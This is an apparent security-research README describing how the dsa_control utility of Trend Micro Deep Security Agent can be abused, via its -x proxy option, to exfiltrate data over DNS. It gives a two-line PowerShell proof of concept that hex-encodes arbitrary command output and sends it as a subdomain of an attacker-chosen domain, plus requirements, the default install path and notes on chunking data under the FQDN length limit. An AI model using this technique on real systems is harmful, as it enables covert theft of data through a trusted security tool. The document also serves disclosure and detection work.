## Trend Micro Deep Security Agent: DNS Exfiltration using legitimate CLI utility

<img src="assets/logo.png" width=150>

An interesting way of using the `dsa_control` CLI tool, included in `Trend Micro's Deep Security Agent (DSA)` solution, specifically its `-x` proxy feature, is that an actor can "abuse" it to make the tool resolve a given domain with out breaking the existing DSA configuration. This could allow data to be exfiltrated using a legitimate tool.

"The [dsa_control](https://help.deepsecurity.trendmicro.com/aws/command-line-interface.html#dsa_cont) enables you to configure some of the Deep Security Agent settings and manually trigger such actions as activation, anti-malware scans, and baseline rebuilds."

⚠️NOTE: Using the `-x` proxy option may interrupt communication between the specific agent and Trend Cloud One.

Requirements:
- Administrative privileges
- Trend Micro Deep Security Agent Installed

dsa_control path: (default)
- `C:\Program Files\Trend Micro\Deep Security Agent\`

⚠️NOTE: The entire FQDN has a max length of 255 characters, so the exfiltrated data must be sent in chunks(if necessary).

- [Trend Micro Configuration](#trend-micro-configuration)
- [POC](#poc)
- [Example](#example)

## Trend Micro Configuration
![alt text](assets/3.png)


## POC
```powershell
$cmd = -join ([System.Text.Encoding]::UTF8.GetBytes((<COMMAND>)) | ForEach-Object { "{0:x2}" -f $_ }) # Convert command output to HEX
```

```powershell
dsa_control.cmd -x "dsm_proxy://$cmd.<domain>:443/"
```

## Example
![alt text](assets/2.PNG)

![alt text](assets/1.png)

